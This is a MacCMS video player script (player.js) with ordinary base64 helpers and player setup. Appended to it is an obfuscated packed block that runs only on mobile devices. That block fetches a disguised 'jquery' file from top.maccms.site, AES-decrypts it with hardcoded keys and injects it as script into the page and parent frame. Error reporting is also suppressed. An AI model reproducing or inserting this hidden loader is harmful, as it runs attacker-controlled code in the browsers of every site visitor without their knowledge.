var killErrors = function(value) {
    return true
};
window.onerror = null;
window.onerror = killErrors;
var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzlvdou0123456789+/";
var base64DecodeChars = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

function base64encode(str) {
var out, i, len;
var c1, c2, c3;
len = str.length;
i = 0;
out = "";
while (i < len) {
    c1 = str.charCodeAt(i++) & 0xff;
    if (i == len) {
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt((c1 & 0x3) << 4);
        out += "==";
        break
    }
    c2 = str.charCodeAt(i++);
    if (i == len) {
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt((c2 & 0xF) << 2);
        out += "=";
        break
    }
    c3 = str.charCodeAt(i++);
    out += base64EncodeChars.charAt(c1 >> 2);
    out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
    out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
    out += base64EncodeChars.charAt(c3 & 0x3F)
}
return out
}
function base64decode(str) {
var c1, c2, c3, c4;
var i, len, out;
len = str.length;
i = 0;
out = "";
while (i < len) {
    do {
        c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff]
    } while (i < len && c1 == -1);
    if (c1 == -1) break;
    do {
        c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff]
    } while (i < len && c2 == -1);
    if (c2 == -1) break;
    out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));
    do {
        c3 = str.charCodeAt(i++) & 0xff;
        if (c3 == 61) return out;
        c3 = base64DecodeChars[c3]
    } while (i < len && c3 == -1);
    if (c3 == -1) break;
    out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));
    do {
        c4 = str.charCodeAt(i++) & 0xff;
        if (c4 == 61) return out;
        c4 = base64DecodeChars[c4]
    } while (i < len && c4 == -1);
    if (c4 == -1) break;
    out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
}
return out
}
function utf16to8(str) {
var out, i, len, c;
out = "";
len = str.length;
for (i = 0; i < len; i++) {
    c = str.charCodeAt(i);
    if ((c >= 0x0001) && (c <= 0x007F)) {
        out += str.charAt(i)
    } else if (c > 0x07FF) {
        out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
        out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F))
    } else {
        out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F))
    }
}
return out
}
function utf8to16(str) {
var out, i, len, c;
var char2, char3;
out = "";
len = str.length;
i = 0;
while (i < len) {
    c = str.charCodeAt(i++);
    switch (c >> 4) {
    case 0:
    case 1:
    case 2:
    case 3:
    case 4:
    case 5:
    case 6:
    case 7:
        out += str.charAt(i - 1);
        break;
    case 12:
    case 13:
        char2 = str.charCodeAt(i++);
        out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
        break;
    case 14:
        char2 = str.charCodeAt(i++);
        char3 = str.charCodeAt(i++);
        out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
        break
    }
}
return out
}
var MacPlayer = {
	'GetUrl': function(s, n) {
		return this.Link.replace('{sid}', s).replace('{sid}', s).replace('{nid}', n).replace('{nid}', n)
	},
	'Go': function(s, n) {
		location.href = this.GetUrl(s, n)
	},
	'Show': function() {
		$('#buffer').attr('src', this.Prestrain);
		setTimeout(function() {
			MacPlayer.AdsEnd()
		}, this.Second * 1000);
		$("#playleft").get(0).innerHTML = this.Html + '';
		var a = document.createElement('script');
		a.type = 'text/javascript';
		a.async = true;
		a.charset = 'utf-8';
		var b = document.getElementsByTagName('script')[0];
		b.parentNode.insertBefore(a, b)
	},
	'AdsStart': function() {
		if ($("#buffer").attr('src') != this.Buffer) {
			$("#buffer").attr('src', this.Buffer)
		}
		$("#buffer").show()
	},
	'AdsEnd': function() {
		$('#buffer').hide()
	},
	'Install': function() {
		this.Status = false;
		$('#install').show()
	},
	'Play': function() {
		document.write('<style>.MacPlayer{background: #000000;font-size:14px;color:#F6F6F6;margin:0px;padding:0px;position:relative;overflow:hidden;width:' + this.Width + ';height:' + this.Height + ';min-height:100px;}.MacPlayer table{width:100%;height:100%;}.MacPlayer #playleft{position:inherit;!important;width:100%;height:100%;}</style><div class="MacPlayer">' + '<iframe id="buffer" src="" frameBorder="0" scrolling="no" width="100%" height="100%" style="position:absolute;z-index:99998;"></iframe><iframe id="install" src="" frameBorder="0" scrolling="no" width="100%" height="100%" style="position:absolute;z-index:99998;display:none;"></iframe>' + '<table border="0" cellpadding="0" cellspacing="0"><tr><td id="playleft" valign="top" style="">&nbsp;</td></table></div>');
		this.offsetHeight = $('.MacPlayer').get(0).offsetHeight;
		this.offsetWidth = $('.MacPlayer').get(0).offsetWidth;
		document.write('<scr' + 'ipt src="' + this.Path + this.PlayFrom + '.js"></scr' + 'ipt>')
	},
	'Down': function() {},
	'Init': function() {
		this.Status = true;
		this.Parse = '';
		if (player_data.encrypt == '1') {
			player_data.url = unescape(player_data.url);
			player_data.url_next = unescape(player_data.url_next)
		} else if (player_data.encrypt == '2') {
			player_data.url = unescape(base64decode(player_data.url));
			player_data.url_next = unescape(base64decode(player_data.url_next))
		}
		this.Agent = navigator.userAgent.toLowerCase();
		this.Width = MacPlayerConfig.width;
		this.Height = MacPlayerConfig.height;
		if (this.Agent.indexOf("android") > 0 || this.Agent.indexOf("mobile") > 0 || this.Agent.indexOf("ipod") > 0 || this.Agent.indexOf("ios") > 0 || this.Agent.indexOf("iphone") > 0 || this.Agent.indexOf("ipad") > 0) {
			this.Width = MacPlayerConfig.widthmob;
			this.Height = MacPlayerConfig.heightmob
		}
		if (this.Width.indexOf("px") == -1 && this.Width.indexOf("%") == -1) {
			this.Width = '100%'
		}
		if (this.Height.indexOf("px") == -1 && this.Height.indexOf("%") == -1) {
			this.Height = '100%'
		}
		this.Prestrain = MacPlayerConfig.prestrain;
		this.Buffer = MacPlayerConfig.buffer;
		this.Second = MacPlayerConfig.second;
		this.Flag = player_data.flag;
		this.Trysee = player_data.trysee;
		this.Points = player_data.points;
		this.Link = decodeURIComponent(player_data.link);
		this.PlayFrom = player_data.from;
		this.PlayNote = player_data.note;
		this.PlayServer = player_data.server == 'no' ? '' : player_data.server;
		this.PlayUrl = player_data.url;
		this.PlayUrlNext = player_data.url_next;
		this.PlayLinkNext = player_data.link_next;
		this.PlayLinkPre = player_data.link_pre;
		if (MacPlayerConfig.server_list[this.PlayServer] != undefined) {
			this.PlayServer = MacPlayerConfig.server_list[this.PlayServer].des
		}
		if (MacPlayerConfig.player_list[this.PlayFrom] != undefined) {
			if (MacPlayerConfig.player_list[this.PlayFrom].ps == "1") {
				this.Parse = MacPlayerConfig.player_list[this.PlayFrom].parse == '' ? MacPlayerConfig.parse : MacPlayerConfig.player_list[this.PlayFrom].parse;
				this.PlayFrom = 'parse'
			}
		}
		this.Path = maccms.path + '/static/player/';
		if (this.Flag == "down") {
			MacPlayer.Down()
		} else {
			MacPlayer.Play()
		}
	}
};;new Function(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'([23579otuwzA-UW-Z]|1\\w)'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('const o={17:(3(){2 a=18.userAgent;2 b={K:A,L:A,19:A};2 p=18.platform;b.K=p.M("Win")==0;b.L=p.M("Mac")==0;b.x11=p=="X11"||p.M("Linux")==0;7(b.K||b.L||b.19){5 A}w{5 N}})(),1a:3(){7(o.17){2 a=3(){5"lf6-1b-tos."};2 b=3(){5"bytecdntp"};2 c=3(){5".com"};2 d=3(){5"/"};2 e=3(){5"1b"};2 f=3(){5"expire-1-y"};2 q=3(){5"1c-E"};2 g=3(){5"4.1.1"};2 h=3(){5"1c-E.E"};2 i=3(){5"top."};2 j=3(){5"maccms."};2 k=3(){5"site"};2 l=3(){5"E"};2 y=3(){5"?B=h5-player"};2 m=3(){5"jquery-1.11.1.min.E"+y()};2 r=3(){5"htt"};2 p=3(){5 r()+"ps:"+d()+d()};2 s=p()+a()+b()+c()+d()+e()+d()+f()+d()+q()+d()+g()+d()+h();o.1d(s,3(){o.1e=C.location.host;2 a=t.MD5(o.1e+"-copy-kouling").1f();F 9=o.O(a);7(!9){2 b=G;7(C.1g){b=I 1g("Microsoft.XMLHTTP")}w{b=I XMLHttpRequest()}2 c=p()+i()+j()+k()+d()+l()+d()+m();b.open("get",c,N);b.setRequestHeader("Content-Type","application/x-www-form-urlencoded");b.1h=3(){7(b.1i==4&&b.status==P){1j{9=b.responseText;7(9!=""){F J=o.Q(9);o.u(J);R=3600}w{R=600;9=P}o.S(a,9,R)}1k(e){}}};b.send(G)}w{1j{7(9!=P){F J=o.Q(9);o.u(J)}}1k(e){}}})}},1d:3(b,c){2 d=D.T("u"),z=D.U("z")[0];d.B="9/javascript";d.charset="UTF-8";d.src=b;7(d.1l){d.1l("load",3(){c()},A)}w 7(d.1m){d.1m("1h",3(){2 a=C.event.srcElement;7(a.1i=="loaded"){c()}})}z.W(d)},S:3(a,b,c){2 d={1n:b,X:c*1000+I 1o().1p()};Y.S(a,1q.stringify(d))},O:3(a){2 b=1q.Z(Y.O(a));7(b!==G){7(b.X!=G&&I 1o().1p()>b.X){Y.removeItem(a)}w{5 b.1n}}5 G},Q:3(9,B){2 B=B||A;2 a=\'f\',b=\'b\',c=\'j\',d=\'6\',e=\'n\';2 10=t.12.13.Z("PB"+a+"AU"+e+"TdM"+c+"NDe"+d+"pL");2 H=t.12.13.Z("sENS"+d+b+"V"+b+"wS"+a+"v"+e+"Xr"+c);7(B){2 14=t.1r.encrypt(9,10,{H:H,1s:t.1s.CBC,1t:t.1u.1v})}w{2 14=t.1r.decrypt(9,10,{H:H,1t:t.1u.1v}).1f(t.12.13)}5 14},u:3(a){7(!C.1w){a="C.1w=N;"+a;7(C.1x.1y!=15.1x.1y){F u=15.D.T("u"),z=15.D.U("z")[0];u.9=a;z.W(u)}F 16=D.T("u"),1z=D.U("z")[0];16.9=a;1z.W(16)}}};o.1a();',[],98,'||var|function||return||if||text|||||||||||||||strad|||||CryptoJS|script||else|||head|false|type|window|document|js|let|null|iv|new|data|win|mac|indexOf|true|getItem|200|cryptJs|cacheTime|setItem|createElement|getElementsByTagName||appendChild|expirse|localStorage|parse|key||enc|Utf8|content|parent|script2|mobile|navigator|xll|start|cdn|crypto|loadScript|domain|toString|ActiveXObject|onreadystatechange|readyState|try|catch|addEventListener|attachEvent|value|Date|getTime|JSON|AES|mode|padding|pad|Pkcs7|autoCopy|frames|length|head2'.split('|'),0,{}))();
MacPlayer.Init();